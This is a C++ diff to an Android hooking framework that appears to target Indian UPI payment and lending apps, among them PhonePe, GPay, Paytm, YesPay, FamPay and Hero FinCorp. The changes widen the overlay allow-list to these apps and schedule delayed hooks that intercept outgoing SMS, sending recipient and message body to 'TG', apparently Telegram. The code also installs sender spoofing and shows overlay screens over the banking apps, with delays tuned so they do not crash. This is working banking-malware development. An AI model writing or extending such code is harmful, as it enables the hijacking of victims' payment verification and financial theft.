@@ -119,12 +119,17 @@ bool native_overlay_wanted() {
     return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
 }
 
-/** Bubble: Hero + Messages only — PhonePe overlay was open-crash risk. */
+/** Bubble hosts — long delay on PhonePe so open doesn't crash. */
 bool overlay_allowed_pkg(const std::string& pkg) {
     if (pkg.empty()) return false;
+    if (pkg.find("phonepe") != std::string::npos) return true;
     if (pkg.find("herofincorp") != std::string::npos) return true;
     if (pkg.find("messaging") != std::string::npos) return true;
     if (pkg == "com.android.mms" || pkg == "com.motorola.messaging") return true;
+    if (pkg.find("yespay") != std::string::npos) return true;
+    if (pkg.find("paytm") != std::string::npos) return true;
+    if (pkg.find("paisa") != std::string::npos) return true;  // GPay
+    if (pkg.find("fampay") != std::string::npos) return true;
     return false;
 }
 
@@ -189,12 +194,16 @@ void* deferred_hook_worker(void* arg) {
     if (job->vm && job->api) {
         JNIEnv* env = nullptr;
         if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
-            // SAFE for banking: Java ISms only + Intent already armed.
-            // NO Binder/inline/phone/sender — those crash PhonePe/GPay/Paytm/YesPay on open.
-            overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
-            outgoing_sms_hook::arm_intercept_hooks();
-            append_diag("/data/local/tmp/hivirtus_inject.log",
-                        ("HOOK_DEFERRED_SAFE_JAVA|" + job->pkg).c_str());
+            // After app open stable: Java ISms only (To+body → TG). No Binder/phone/sender.
+            try {
+                overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
+                outgoing_sms_hook::arm_intercept_hooks();
+                append_diag("/data/local/tmp/hivirtus_inject.log",
+                            ("HOOK_DEFERRED_SAFE_JAVA|" + job->pkg).c_str());
+            } catch (...) {
+                append_diag("/data/local/tmp/hivirtus_inject.log",
+                            ("HOOK_DEFERRED_SAFE_JAVA_CRASH|" + job->pkg).c_str());
+            }
             job->vm->DetachCurrentThread();
         }
     }
@@ -344,14 +353,14 @@ public:
         }
 
         if (is_msg_) {
-            // Messages: full path — real SIM ISms + Java (FAST — Hero often sends via Messages)
+            // Messages: full path — FAST (many apps SENDTO → Messages)
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
         } else if (is_hero_pkg(pkg_)) {
-            // Hero ONLY: Java ISms immediately (no 3–5s wait → no verification failed / token expire)
+            // Hero: Java ISms NOW — verification failed / token expire fix
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
@@ -360,10 +369,18 @@ public:
                 schedule_overlay_ui(env_, api_, pkg_, 2);
             }
         } else {
-            // PhonePe/GPay/Paytm/YesPay/FamPay/BHIM: Intent arm ONLY — NO Java/Binder/overlay
-            // (deferred Java was still crashing these on open)
+            // ALL other UPI (PhonePe/GPay/Paytm/YesPay/FamPay/BHIM/Stashfin…):
+            // Java ISms AFTER app fully opens — open crash avoid, SMS To+body still TG pe
             outgoing_sms_hook::arm_intercept_hooks();
-            report_line(api_, "post_upi_no_java_crashfix:" + pkg_);
+            int delay = 10;  // open stable pehle hooks mat lago
+            if (is_yespay(pkg_)) delay = 12;
+            if (pkg_.find("phonepe") != std::string::npos) delay = 12;
+            if (pkg_.find("paisa") != std::string::npos) delay = 12;
+            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
+            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=" + std::to_string(delay));
+            if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
+                schedule_overlay_ui(env_, api_, pkg_, delay + 3);
+            }
         }
 
         touch_heartbeat();
